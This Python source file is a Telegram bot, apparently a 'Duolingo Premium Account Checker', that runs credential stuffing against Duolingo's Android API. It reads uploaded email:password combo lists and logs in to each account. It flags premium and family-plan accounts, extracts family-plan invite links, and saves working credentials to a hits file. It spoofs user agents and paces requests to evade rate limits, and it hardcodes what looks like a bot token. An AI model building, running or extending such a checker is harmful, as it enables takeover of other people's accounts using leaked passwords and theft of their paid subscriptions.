import telebot
import requests
import json
import time
import re
import uuid
from datetime import datetime

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_ID = 8770379893
# ===================================

bot = telebot.TeleBot(BOT_TOKEN)

# Headers for Android API
def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    # Random Android User-Agent
    versions = ["10", "11", "12", "13"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11"]
    return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"

def check_duolingo(email, password):
    session = requests.Session()
    ua = generate_ua()
    
    try:
        # STEP 1: Login to get user ID and JWT
        login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
        distinct_id = str(uuid.uuid4())
        
        login_payload = {
            "distinctId": distinct_id,
            "identifier": email,
            "password": password
        }
        
        login_headers = get_headers(ua)
        login_headers["Content-Type"] = "application/json"
        
        resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=15)
        
        if resp.status_code != 200:
            return None, "❌ Login failed - wrong credentials"
        
        login_data = resp.json()
        
        # Extract user ID and JWT from cookies
        user_id = login_data.get("id")
        if not user_id:
            return None, "❌ Failed to get user ID"
        
        # Get JWT from cookies
        jwt_token = None
        for cookie in session.cookies:
            if cookie.name == "jwt_token":
                jwt_token = cookie.value
                break
        
        if not jwt_token:
            return None, "❌ Failed to get authentication token"
        
        # STEP 2: Get full user profile
        profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=adsConfig%7Bunits%7D%2Cid%2CbetaStatus%2CblockerUserIds%2CblockedUserIds%2CclassroomLeaderboardsEnabled%2CcoachOutfit%2Ccourses%7BalphabetsPathProgressKey%2Cid%2Csubject%2Ctopic%2Cxp%2CauthorId%2Ccrowns%2ChealthEnabled%2CfromLanguage%2ClearningLanguage%7D%2CcreationDate%2CcurrentCourseId%2Cemail%2CemailAnnouncement%2CemailFollow%2CemailPass%2CemailPromotion%2CemailResearch%2CemailStreakFreezeUsed%2CemailWeeklyProgressReport%2CfacebookId%2CfeedbackProperties%2CfromLanguage%2CgemsConfig%7Bgems%2CgemsPerSkill%2CuseGems%7D%2CglobalAmbassadorStatus%7Blevel%2Ctypes%7D%2CgoogleId%2ChasFacebookId%2ChasGoogleId%2ChasPlus%2ChasRecentActivity15%2Chealth%7BeligibleForFreeRefill%2ChealthEnabled%2CuseHealth%2Chearts%2CmaxHearts%2CsecondsPerHeartSegment%2CsecondsUntilNextHeartSegment%2CnextHeartEpochTimeMs%2CunlimitedHeartsAvailable%7D%2CinviteURL%2CjoinedClassroomIds%2ClastResurrectionTimestamp%2ClearningLanguage%2Clingots%2CliteracyAdGroup%2Cname%2CobservedClassroomIds%2CoptionalFeatures%7Bid%2Cstatus%7D%2CpersistentNotifications%2CphoneNumber%2Cpicture%2CplusDiscounts%7BexpirationEpochTime%2CdiscountType%2CsecondsUntilExpiration%7D%2CpracticeReminderSettings%2CprivacySettings%2CpushAnnouncement%2CpushEarlyBird%2CpushNightOwl%2CpushFollow%2CpushLeaderboards%2CpushPassed%2CpushPromotion%2CpushStreakFreezeUsed%2CpushStreakSaver%2CpushSchoolsAssignment%2CreferralInfo%7BhasReachedCap%2CnumBonusesReady%2CunconsumedInviteeIds%2CunconsumedInviteeName%2CinviterName%2CisEligibleForBonus%2CisEligibleForOffer%7D%2CrewardBundles%7Bid%2CrewardBundleType%2Crewards%7Bid%2Cconsumed%2CitemId%2Ccurrency%2Camount%2CrewardType%7D%7D%2Croles%2CshakeToReportEnabled%2CshouldForceConnectPhoneNumber%2CsmsAll%2CshopItems%7Bid%2CpurchaseDate%2CpurchasePrice%2Cquantity%2CsubscriptionInfo%7Bcurrency%2CexpectedExpiration%2CisFreeTrialPeriod%2CperiodLength%2Cprice%2CproductId%2Crenewer%2Crenewing%2CvendorPurchaseId%7D%2CwagerDay%2CexpectedExpirationDate%2CpurchaseId%2CremainingEffectDurationInSeconds%2CexpirationEpochTime%2CfamilyPlanInfo%7BownerId%2CsecondaryMembers%2CinviteToken%2CpendingInvites%7BfromUserId%2CtoUserId%2Cstatus%7D%7D%7D%2Cstreak%2CstreakData%7Blength%2CstartTimestamp%2CupdatedTimestamp%2CupdatedTimeZone%2CxpGoal%7D%2CsubscriptionConfigs%7BisInBillingRetryPeriod%2CisInGracePeriod%2CvendorPurchaseId%2CproductId%2CpauseStart%2CpauseEnd%2CreceiptSource%7D%2Ctimezone%2CtotalXp%2CtrackingProperties%2Cusername%2CxpGains%7Btime%2Cxp%2CeventType%2CskillId%7D%2CxpGoal%2CzhTw%2CtimerBoostConfig%7BtimerBoosts%2CtimePerBoost%2ChasFreeTimerBoost%7D%2CenableSpeaker%2CenableMicrophone%2CchinaUserModerationRecords%7Bcontent%2Cdecision%2Crecord_identifier%2Crecord_type%2Csubmission_time%2Cuser_id%7D"
        
        profile_headers = get_headers(ua, jwt_token)
        
        resp2 = session.get(profile_url, headers=profile_headers, timeout=15)
        
        if resp2.status_code != 200:
            return None, "❌ Failed to fetch profile data"
        
        data = resp2.json()
        
        # Extract data (matching your config)
        username = data.get("username", "N/A")
        total_xp = data.get("totalXp", 0)
        gems = data.get("gemsConfig", {}).get("gems", 0)
        streak = data.get("streakData", {}).get("length", 0)
        learning_lang = data.get("learningLanguage", "N/A")
        from_lang = data.get("fromLanguage", "N/A")
        
        # Premium detection (your config uses has_item_premium_subscription)
        shop_items = data.get("shopItems", [])
        has_premium = False
        product_id = "N/A"
        renewing = "N/A"
        is_free_trial = "N/A"
        plan_tier = "N/A"
        sub_type = "N/A"
        invite_token = "N/A"
        expiry_date = "N/A"
        
        for item in shop_items:
            sub_info = item.get("subscriptionInfo", {})
            if sub_info:
                has_premium = True
                product_id = sub_info.get("productId", "N/A")
                renewing = "Yes" if sub_info.get("renewing") else "No"
                is_free_trial = "Yes" if sub_info.get("isFreeTrialPeriod") else "No"
                if sub_info.get("expectedExpiration"):
                    expiry_date = datetime.fromtimestamp(sub_info.get("expectedExpiration") / 1000).strftime("%Y-%m-%d")
            
            # Family plan info
            family_info = item.get("familyPlanInfo", {})
            if family_info:
                invite_token = family_info.get("inviteToken", "N/A")
                plan_tier = "FAMILY"
        
        # Alternative premium check from your config
        if not has_premium:
            has_premium = data.get("hasPlus", False)
            if data.get("subscriptionConfigs"):
                sub_type = "Premium"
                has_premium = True
        
        # Determine plan type
        if invite_token != "N/A":
            plan_display = "👨‍👩‍👧 **FAMILY PLAN** 👨‍👩‍👧"
            invite_link = f"https://www.duolingo.com/family-plan?invite={invite_token}"
        elif has_premium:
            if plan_tier == "FAMILY":
                plan_display = "👨‍👩‍👧 **FAMILY PLAN** 👨‍👩‍👧"
            else:
                plan_display = "⭐ **SUPER / PREMIUM** ⭐"
            invite_link = None
        else:
            plan_display = "⚠️ **FREE ACCOUNT** ⚠️"
            invite_link = None
        
        # Build result
        result = f"""
✅ **HIT** | `{email}`

📊 **ACCOUNT DETAILS:**
├─ Username: `{username}`
├─ Total XP: `{total_xp:,}`
├─ Gems: `{gems}`
├─ Streak: `{streak} days` 🔥
├─ Learning: `{learning_lang}` (from `{from_lang}`)
└─ Plan: {plan_display}
"""
        
        if has_premium:
            result += f"""
💎 **SUBSCRIPTION INFO:**
├─ Product ID: `{product_id}`
├─ Auto-renew: `{renewing}`
├─ Free trial: `{is_free_trial}`
└─ Expires: `{expiry_date}`
"""
        
        if invite_token != "N/A":
            result += f"""
🔗 **FAMILY PLAN INVITE:**
`{invite_link}`
"""
        
        result += f"\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
        
        return "HIT", result
        
    except Exception as e:
        return None, f"❌ Error: {str(e)[:80]}"

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized user.")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = telebot.types.KeyboardButton("📂 Check Duolingo Premium Accounts")
    markup.add(btn)
    
    bot.reply_to(
        message,
        "👋 **Duolingo Premium Account Checker**\n\n"
        "**Config:** [ DUOLINGO ] BY ThuYa V3\n"
        "**Author:** @thuyaaungzaw\n\n"
        "Click button below and send your **email:pass** combo file (.txt)\n\n"
        "Format: `email@gmail.com:password123`",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(func=lambda m: m.text == "📂 Check Duolingo Premium Accounts")
def ask_file(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "📎 Send your **email:pass** combo file (.txt)", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Unauthorized")
        return
    
    status_msg = bot.reply_to(message, "📥 Downloading file...")
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    content = downloaded_file.decode('utf-8', errors='ignore')
    combos = []
    for line in content.split('\n'):
        line = line.strip()
        if ':' in line and line.count(':') == 1:
            email, pwd = line.split(':', 1)
            combos.append((email.strip(), pwd.strip()))
    
    if not combos:
        bot.edit_message_text("❌ No valid combos found. Format: email:pass", status_msg.chat.id, status_msg.message_id)
        return
    
    bot.edit_message_text(f"📥 `{len(combos)}` combos loaded.\n🔍 Starting check...", status_msg.chat.id, status_msg.message_id, parse_mode="Markdown")
    
    premium_hits = []
    free_accounts = 0
    invalid = 0
    
    for i, (email, pwd) in enumerate(combos):
        bot.send_message(message.chat.id, f"🔍 `[{i+1}/{len(combos)}]` Checking: `{email}`", parse_mode="Markdown")
        
        status, detail = check_duolingo(email, pwd)
        
        if status == "HIT":
            premium_hits.append((email, pwd, detail))
            bot.send_message(message.chat.id, detail, parse_mode="Markdown")
        else:
            invalid += 1
            if "FREE" in str(detail):
                free_accounts += 1
            bot.send_message(message.chat.id, f"❌ `{email}`\n{detail[:100]}", parse_mode="Markdown")
        
        time.sleep(2)  # Rate limit avoidance
    
    summary = f"""
✅ **Check Completed!**

📊 **Summary:**
├─ Total: `{len(combos)}`
├─ ⭐ Premium/Family: `{len(premium_hits)}`
├─ ⚠️ Free: `{free_accounts}`
└─ ❌ Failed: `{invalid}`

💾 Premium accounts saved below 👇
"""
    bot.send_message(message.chat.id, summary, parse_mode="Markdown")
    
    if premium_hits:
        hit_content = f"# [ DUOLINGO ] BY ThuYa V3\n# Author: @thuyaaungzaw\n# Premium/Family Accounts\n\n"
        for email, pwd, detail in premium_hits:
            hit_content += f"{email}:{pwd}\n{detail}\n{'='*60}\n\n"
        
        with open("premium_hits.txt", "w", encoding="utf-8") as f:
            f.write(hit_content)
        
        with open("premium_hits.txt", "rb") as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.send_message(message.chat.id, "No premium/family accounts found.")

print("🤖 Duolingo Premium Checker Bot is running...")
print("Config: [ DUOLINGO ] BY ThuYa V3")
print("Author: @thuyaaungzaw")
bot.infinity_polling()